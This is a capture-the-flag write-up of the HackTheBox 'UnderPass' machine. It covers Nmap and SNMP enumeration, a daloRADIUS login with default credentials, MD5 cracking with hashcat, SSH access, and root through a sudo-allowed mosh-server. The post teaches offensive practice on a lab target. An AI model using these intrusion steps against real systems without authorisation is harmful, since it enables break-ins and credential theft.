+++
title = "HackTheBox | UnderPass"
date = 2025-05-10
[taxonomies]
categories = ["CTF"]
tags = ["CTF", "HackTheBox"]
+++

HackTheBox UnderPass easy box write-up.

<!-- more -->

**Originally published on Medium on December 22, 2024.**

{{ image(src="/UnderPass.png", alt="info card", width=600) }}

## Initial Foothold

As usual, we begin with **Nmap** scan.

```
# Nmap 7.94SVN scan initiated Sun Dec 22 09:37:19 2024 as: nmap -sS -p- -sC -sV -Pn --min-rate 500 -oN mainScan 10.10.11.48
Nmap scan report for 10.10.11.48
Host is up (0.66s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelba
```

I was stuck for more than an hour with the web application because I thought as usual for easy boxes it would be a vulnerable version of an application or something that was not complicated, so in these cases, I returned to recon again and initiated a UDP scan:
```
# Nmap 7.94SVN scan initiated Sun Dec 22 10:28:39 2024 as: nmap -sU -p- --min-rate 500 -oN mainUDPScan underpass.htb
Warning: 10.10.11.48 giving up on port because retransmission cap hit (10).
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (1.5s latency).
Not shown: 64155 open|filtered udp ports (no-response), 1379 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

# Nmap done at Sun Dec 22 10:52:44 2024 -- 1 IP address (1 host up) scanned in 1444.89 seconds
```
Let's keep enumerating with **NSE**:

```
# Nmap 7.94SVN scan initiated Sun Dec 22 10:54:56 2024 as: nmap -sU -p 161 --script=snmp* --min-rate 500 -oN mainSNMPScan underpass.htb
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.13s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 29
|_  snmpEngineTime: 48m47s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 48m50.75s (293075 timeticks)
| snmp-brute:
|_  public - Valid credentials

# Nmap done at Sun Dec 22 10:55:17 2024 -- 1 IP address (1 host up) scanned in 20.60 seconds
```
No, it's not enough, keep enumerating using **snmpbulkwalk**.

```bash

root@machiavelli:~# snmpbulkwalk -c public -v2c underpass.htb
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (304411) 0:50:44.11
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
```
The **STRINGS** `steve@underpass.htb` and `UnDerPass.htb is the only daloradius server in the basin!` are pretty interesting, after some googling about [daloradius server](https://github.com/lirantal/daloradius) we discovered that we can log in to through `http://underpass.htb/daloradius/app/operators/login.php` with the default credentials:
```
Username: administrator
Password: radius
```
The credentials are valid!
{{ image(src="/Home.png", alt="home page", width=600) }}

The `users list` looks good, let's check it.
We found an MD5 hashed password and a username.

{{ image(src="/UsersList.png", alt="users list", width=600) }}

Cracking the password using **john** or **hashcat**, I'll go with **hashcat**.

```bash

root@machiavelli:~# hashcat -m 0 UserHash /usr/share/wordlists/rockyou.txt

UserHash:crackedPassword

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: UserHash
Time.Started.....: Sun Dec 22 11:14:32 2024 (2 secs)
Time.Estimated...: Sun Dec 22 11:14:34 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2749.2 kH/s (0.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2985984/14344385 (20.82%)
Rejected.........: 0/2985984 (0.00%)
Restore.Point....: 2983936/14344385 (20.80%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: underwear63 -> unc112886
Hardware.Mon.#1..: Util: 43%
```

Then we can use the username with the cracked password to connect over SSH and capture the user.txt:

```bash

root@machiavelli:~# ssh svcMosh@underpass.htb
svcMosh@underpass.htb's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Dec 22 06:25:00 PM UTC 2024

  System load:  0.0               Processes:             329
  Usage of /:   95.9% of 3.75GB   Users logged in:       1
  Memory usage: 20%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

  => / is using 95.9% of 3.75GB

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Dec 22 17:40:45 2024 from 10.10.16.18
svcMosh@underpass:~$ ls
user.txt
svcMosh@underpass:~$ cat user.txt
e918adf7ea4b7b3d6b4bc53486f3f81a
```

## Privilege Escalation

The first thing we check while trying to escalate our privileges is `sudo -l`:

```bash

svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
svcMosh@underpass:~$
```
When it's your first time facing a new command or service, reading the manual is a good thing:

```bash

svcMosh@underpass:~$ man /usr/bin/mosh-server

***
DESCRIPTION
       mosh-server is a helper program for the mosh(1) remote terminal application.

       mosh-server binds to a high UDP port and chooses an encryption key to protect the session. It prints both on standard output, detaches from the terminal, and waits for the mosh-client to establish a connection. It will exit if no client has contacted it within 60 seconds.
***
```

Reading the examples will guide you, let's capture the root.txt.

```bash

svcMosh@underpass:~$ sudo /usr/bin/mosh-server new -p 61113

MOSH CONNECT 61113 QzOh2gOWZ3672OIDhszC0A

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 1897]
svcMosh@underpass:~$ MOSH_KEY=QzOh2gOWZ3672OIDhszC0A mosh-client 127.0.0.1  61113

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Dec 22 04:18:05 PM UTC 2024

  System load:  0.78              Processes:             336
  Usage of /:   85.4% of 3.75GB   Users logged in:       1
  Memory usage: 13%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

  => / is using 85.4% of 3.75GB

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@underpass:~# ls
root.txt
root@underpass:~# cat root.txt
0a6c39e93e67c280f799bdb732314b4a
root@underpass:~#
```
**Perfect!**